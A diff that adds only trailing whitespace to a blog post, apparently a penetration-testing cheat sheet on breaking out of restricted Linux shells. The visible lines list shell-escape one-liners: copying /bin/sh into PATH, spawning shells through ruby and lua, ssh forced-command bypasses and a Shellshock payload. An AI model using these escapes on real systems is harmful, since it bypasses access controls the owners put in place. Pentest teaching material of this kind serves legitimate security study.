@@ -5,15 +5,15 @@ date: 2016-10-23
 ---
 This is a quick post on breaking out of linux jail/restricted shells.
 
-Always run your reconnaissance!
+Always run your reconnaissance!  
 
 * Run **env** to list out exported environment variables.
 * **echo $SHELL** what shell are we in?
 * **echo $PATH** what is our path set to?
 * Can you just exploit a running process to escalate privileges and not need to escape out of your shell?
-* Run some basic commands what is and isn\'t allowed? **ls,pwd,cp,mv,env,set,export,vi,\.\.\.**
+* Run some basic commands what is and isn\'t allowed? **ls,pwd,cp,mv,env,set,export,vi,\.\.\.**  
 
-Quick wins from jail
+Quick wins from jail  
 
 * Can you run **cp**? Just copy a file into your path.
   * **`cp /bin/sh /a/dir/from/path; sh`**
@@ -36,7 +36,7 @@ Quick wins from jail
   * **ruby: `ruby exec "/bin/sh"`**
   * **lua: `lua os.execute('/bin/sh')`**  
 
-Quick wins from outside jail
+Quick wins from outside jail  
 
 * Just execute commands before your shell is loaded.
   * **`ssh user@10.10.10.10 -t "/bin/sh"`**
@@ -45,7 +45,7 @@ Quick wins from outside jail
 * Try shellshock
   * **`ssh user@10.10.10.10 -t "() { :; }; /bin/bash"`**  
 
-Getting creative
+Getting creative  
 
 * Using **tee** to write a script.
   * **`echo 'evil code' | tee script.sh`**
